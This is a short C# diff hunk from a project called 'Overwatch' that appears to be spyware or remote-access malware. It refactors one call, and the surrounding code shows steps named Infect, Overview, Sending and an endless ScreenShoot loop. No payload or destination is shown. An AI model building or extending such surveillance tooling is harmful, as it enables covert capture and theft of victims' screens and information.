@@ -14,7 +14,8 @@ namespace Overwatch
                 cChangeLabel.Infect(args);
                 cReceiveInformation info = new cReceiveInformation();
                 info.Overview();
-                cSendingInformation.Sending();
+                cSendingInformation s = new cSendingInformation();
+                s.Sending();
                 while (true)
                 { 
                     info.ScreenShoot();
